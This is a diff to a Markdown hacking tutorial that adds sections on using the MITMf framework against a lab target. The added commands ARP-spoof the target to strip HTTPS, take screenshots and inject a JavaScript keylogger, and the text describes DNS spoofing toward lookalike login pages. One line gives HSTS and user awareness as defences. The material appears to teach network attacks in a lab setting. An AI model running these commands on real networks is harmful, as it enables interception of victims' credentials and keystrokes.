@@ -7,6 +7,8 @@
 	1. [ARP Poisoning](#arp-poisoning)
 	2. [ARP Spoofing](#arp-spoofing)
 		1. [Installing MITMF](#installing-mitmf)
+		2. [Bypassing HTTPS](#bypassing-https)
+	3. [Keyloggers, Screenshots, etc](#other-use-cases)
 
 
 ### Discovering Connected devices
@@ -147,3 +149,27 @@ And while visiting `HTTP` sites you can capture the content of the user name and
 
 > Note that this method would work only with `HTTP` sites. In the next section we will learn about how to bypass `HTTPS` traffic
 
+##### Bypassing HTTPS
+
+```shell
+    root@kali:~/MITMf# python mitmf.py --arp --spoof --gateway 10.0.2.1 --target 10.0.2.4 -i eth0 --hsts
+    ```
+The problem however is that most websites now a days uses the [HTTP Strict Transport Security](http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security#Applicability) which prevents the bypassing of the https security which the MITMF framework tries to do by downgrading the `HTTPS` connection to `HTTP` However, there is a workaround that involves the DNS spoofing attack. In this method, you would redirect the user to a website that looks like the website that the user often goes to to enter their username and password. 
+
+DNS spoofing can be enabled easily by editing the `mitmf.conf` file to redirect the traffic.
+
+Hence, when trying to prevent this type of attack make sure that you have `HSTS` enabled for your website and also make the user aware of such attacks, especially in offices and work places.
+
+#### Other Use Cases
+
+* Taking screenshots 
+```shell
+    root@kali:~/MITMf# python mitmf.py --arp --spoof --gateway 10.0.2.1 --target 10.0.2.4 -i eth0 --screen
+    ```
+*  Injecting Key Logger
+```shell
+    root@kali:~/MITMf# python mitmf.py --arp --spoof --gateway 10.0.2.1 --target 10.0.2.4 -i eth0 --jskeylogger
+    ```
+    
+    
+There are several more, you can run `python mitmf.py` to get the help
